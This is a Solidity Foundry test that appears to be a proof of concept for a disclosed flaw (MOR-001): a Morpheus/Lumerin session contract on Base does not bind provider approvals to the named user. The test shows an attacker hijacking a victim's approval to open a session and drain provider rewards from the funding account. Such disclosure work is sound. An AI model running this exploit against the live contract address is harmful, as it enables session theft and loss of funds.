// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IDiamond {
    struct Session {
        address user;
        bytes32 bidId;
        uint256 stake;
        bytes closeoutReceipt;
        uint256 closeoutType;
        uint256 providerWithdrawnAmount;
        uint128 openedAt;
        uint128 endsAt;
        uint128 closedAt;
        bool isActive;
        bool isDirectPaymentFromUser;
    }

    function providerRegister(address provider_, uint256 amount_, string calldata endpoint_) external;
    function modelRegister(
        address modelOwner_,
        bytes32 baseModelId_,
        bytes32 ipfsCID_,
        uint256 fee_,
        uint256 amount_,
        string calldata name_,
        string[] calldata tags_
    ) external;
    function getModelId(address account_, bytes32 baseModelId_) external view returns (bytes32);
    function postModelBid(address provider_, bytes32 modelId_, uint256 pricePerSecond_) external returns (bytes32);
    function openSession(
        address user_,
        uint256 amount_,
        bool isDirectPaymentFromUser_,
        bytes calldata approvalEncoded_,
        bytes calldata signature_
    ) external returns (bytes32);
    function closeSession(bytes calldata receiptEncoded_, bytes calldata signature_) external;
    function getSession(bytes32 sessionId_) external view returns (Session memory);
    function withdrawUserStakes(address user_, uint8 iterations_) external;
    function getFundingAccount() external view returns (address);
}

/// @notice MOR-001: SessionRouter.openSession does not bind the provider
/// approval to the user named inside it. `_extractProviderApproval` decodes
/// (bidId, chainId, user, timestamp) and discards `user`; the declared error
/// `SessionApprovedForAnotherUser` is never thrown. Any unprivileged address
/// that observes a victim's approval blob + signature (public calldata of a
/// pending openSession tx) can consume it for itself within the 10-min TTL,
/// stealing the victim's session and causing the fundingAccount to pay
/// provider rewards for a session the provider never authorized for that user.
/// Target: LumerinDiamond 0x6aBE1d282f72B474E54527D93b979A4f64d3030a on Base,
/// fork pinned at block 57723502. No privileged accounts are used.
contract ApprovalUserBindingTest is Test {
    error SessionDuplicateApproval();

    address constant DIAMOND = 0x6aBE1d282f72B474E54527D93b979A4f64d3030a;
    address constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
    uint256 constant FORK_BLOCK = 57723502;

    uint256 constant PROVIDER_KEY = 0x1111;
    uint256 constant VICTIM_KEY = 0x2222;
    uint256 constant ATTACKER_KEY = 0x3333;

    address provider;
    address victim;
    address attacker;

    function setUp() public {
        vm.createSelectFork(vm.envString("BASE_RPC_URL"), FORK_BLOCK);
        provider = vm.addr(PROVIDER_KEY);
        victim = vm.addr(VICTIM_KEY);
        attacker = vm.addr(ATTACKER_KEY);

        // Fund unprivileged test accounts with MOR (fork cheatcode, no prank
        // as owner/admin/multisig anywhere in this test).
        deal(MOR, provider, 20_000 ether);
        deal(MOR, victim, 200_000 ether);
        deal(MOR, attacker, 200_000 ether);

        // Provider registers (0.2 MOR minimum stake; stake 10_000 MOR so the
        // 365-day stake limiter does not cap the reward in this test).
        vm.startPrank(provider);
        IERC20(MOR).approve(DIAMOND, type(uint256).max);
        IDiamond(DIAMOND).providerRegister(provider, 10_000 ether, "prov.example:8080");

        // Provider registers a model it owns and posts a bid at max price.
        bytes32 baseModelId = keccak256("morpheus-test-model");
        string[] memory tags = new string[](0);
        IDiamond(DIAMOND).modelRegister(provider, baseModelId, bytes32(uint256(1)), 0, 1 ether, "m", tags);
        bytes32 modelId = IDiamond(DIAMOND).getModelId(provider, baseModelId);
        IDiamond(DIAMOND).postModelBid(provider, modelId, 1e16); // max pricePerSecond
        vm.stopPrank();
    }

    function _ethSign(uint256 key, bytes memory payload) internal pure returns (bytes memory) {
        bytes32 digest = keccak256(payload);
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", digest));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, ethHash);
        return abi.encodePacked(r, s, v);
    }

    function testStolenApprovalOpensAttackerSessionAndDrainsFundingAccount() public {
        bytes32 modelId = IDiamond(DIAMOND).getModelId(provider, keccak256("morpheus-test-model"));
        // Recompute the bid id the same way the diamond does:
        // bidId = keccak256(provider, modelId, nonce 0).
        bytes32 bidId = keccak256(abi.encodePacked(provider, modelId, uint256(0)));

        // Provider issues an approval NAMED FOR THE VICTIM (as its node does
        // in InitiateSessionResponse: (bidId, chainId, user, timestamp)).
        bytes memory approval = abi.encode(bidId, uint256(block.chainid), victim, uint128(block.timestamp));
        bytes memory approvalSig = _ethSign(PROVIDER_KEY, approval);

        uint256 stake = 100_000 ether;

        // ATTACKER consumes the victim's approval for itself. This must
        // revert with SessionApprovedForAnotherUser if the binding were
        // enforced; instead it succeeds.
        vm.startPrank(attacker);
        IERC20(MOR).approve(DIAMOND, type(uint256).max);
        bytes32 sessionId = IDiamond(DIAMOND).openSession(attacker, stake, false, approval, approvalSig);
        vm.stopPrank();

        IDiamond.Session memory session = IDiamond(DIAMOND).getSession(sessionId);
        assertEq(session.user, attacker, "session user must be attacker");
        assertEq(session.bidId, bidId, "session bid mismatch");
        assertTrue(session.isActive, "session must be active");

        // VICTIM's own openSession with the approval issued FOR THE VICTIM
        // now reverts: the single-use approval was consumed by the attacker.
        vm.startPrank(victim);
        IERC20(MOR).approve(DIAMOND, type(uint256).max);
        vm.expectRevert(SessionDuplicateApproval.selector);
        IDiamond(DIAMOND).openSession(victim, stake, false, approval, approvalSig);
        vm.stopPrank();

        // Run the stolen session to its end and close it. The close uses a
        // dispute receipt (signed by the attacker, not the provider), which
        // the contract accepts: the provider is still paid in full when
        // closing at/after endsAt.
        address fundingAccount = IDiamond(DIAMOND).getFundingAccount();
        uint256 fundingBefore = IERC20(MOR).balanceOf(fundingAccount);
        uint256 providerBefore = IERC20(MOR).balanceOf(provider);

        vm.warp(session.endsAt);
        bytes memory receipt = abi.encode(sessionId, uint256(block.chainid), uint128(block.timestamp), uint32(0), uint32(0));
        bytes memory receiptSig = _ethSign(ATTACKER_KEY, receipt);
        vm.prank(attacker);
        IDiamond(DIAMOND).closeSession(receipt, receiptSig);

        uint256 expectedReward = (uint256(session.endsAt) - uint256(session.openedAt)) * 1e16;
        uint256 fundingLoss = fundingBefore - IERC20(MOR).balanceOf(fundingAccount);
        uint256 providerGain = IERC20(MOR).balanceOf(provider) - providerBefore;

        console.log("stolen-session provider reward (wei):", expectedReward);
        console.log("session duration (s):", uint256(session.endsAt) - uint256(session.openedAt));
        console.log("fundingAccount loss (wei):", fundingLoss);

        assertGt(expectedReward, 0, "reward must be positive");
        assertEq(fundingLoss, expectedReward, "fundingAccount must pay exactly the session reward");
        assertEq(providerGain, expectedReward, "provider must receive exactly the session reward");

        // Attacker recovers the full stake (locked portion after release):
        // the attack costs gas only. Warp past the on-hold release and
        // withdraw; the attacker ends with its starting balance.
        vm.warp(uint256(session.endsAt) + 2 days);
        vm.prank(attacker);
        IDiamond(DIAMOND).withdrawUserStakes(attacker, 10);
        assertEq(IERC20(MOR).balanceOf(attacker), 200_000 ether, "attacker stake fully returned");
        assertEq(IERC20(MOR).balanceOf(victim), 200_000 ether, "victim untouched but session stolen");
    }
}
